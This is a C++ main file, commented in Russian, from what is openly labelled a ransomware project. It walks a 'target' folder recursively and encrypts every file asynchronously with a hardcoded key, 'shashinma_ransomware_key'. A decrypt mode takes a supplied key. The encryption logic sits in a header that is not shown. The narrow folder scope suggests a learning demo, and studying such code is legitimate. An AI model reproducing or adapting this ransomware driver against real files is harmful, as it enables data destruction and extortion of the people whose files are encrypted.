// Включение необходимых заголовочных файлов
#include "FileProcessor.h"
#include "OptionsParser.h"
#include <future>

// Определение константы для целевой папки
constexpr auto TARGET_FOLDER = "target";

int main(int argc, char* argv[])
{
    // Создание объекта парсера опций с аргументами командной строки
    OptionsParser parser(argc, argv);
    
    // Разбор аргументов командной строки
    auto result = parser.parse();

    // Проверка наличия опции "decrypt" в результатах разбора
    bool decrypt = result.count("decrypt");

    // Определение пути к целевой папке
    std::filesystem::path folderPath = TARGET_FOLDER;

    // Проверка существования целевой папки
    if (!exists(folderPath)) {
        std::cout << "Error: Directory does not exist: " << folderPath << std::endl;
        return 1;
    }

    // Создание очереди для хранения будущих результатов обработки файлов
    std::deque<std::future<std::filesystem::path>> futures;

    // Проверка наличия ключа при указании опции "decrypt"
    if (decrypt && result["decrypt"].as<std::string>().empty()) {
        std::cout << "Error: Key is required for decryption." << std::endl;
        return 1;
    }

    // Определение пользовательского ключа
    std::vector<uint8_t> customKey;
    if (decrypt) {
        // Если указана опция "decrypt", ключ берется из аргументов командной строки
        std::string keyString = result["decrypt"].as<std::string>();
        customKey = std::vector<uint8_t>(keyString.begin(), keyString.end());
    } else {
        // Иначе используется предопределенный ключ
        customKey = {0x73, 0x68, 0x61, 0x73, 0x68, 0x69, 0x6e, 0x6d,
                                0x61, 0x5f, 0x72, 0x61, 0x6e, 0x73, 0x6f, 0x6d,
                                0x77, 0x61, 0x72, 0x65, 0x5f, 0x6b, 0x65, 0x79};    // "shashinma_ransomware_key" в байтах
    }

    // Создание объекта обработчика файлов с пользовательским ключом
    FileProcessor fileProcessor(customKey);

    // Обход всех файлов в целевой папке
    for (const auto & entry : std::filesystem::recursive_directory_iterator(folderPath))
    {
        // Если указана опция "decrypt", пропускаем файлы без расширения ".enc"
        if (decrypt && entry.path().extension() != EXTENSION) continue;
        // Если опция "decrypt" не указана, пропускаем файлы с расширением ".enc"
        if (!decrypt && entry.path().extension() == EXTENSION) continue;

        // Добавление в очередь асинхронной задачи на обработку файла
        futures.push_back(std::async(std::launch::async, &FileProcessor::processFile, &fileProcessor, entry.path(), decrypt));
    }

    // Ожидание завершения всех асинхронных задач
    while (!futures.empty()) {
        if (futures.front().wait_for(std::chrono::seconds(0)) == std::future_status::ready) {
            futures.pop_front();
        }
    }

    return 0;
}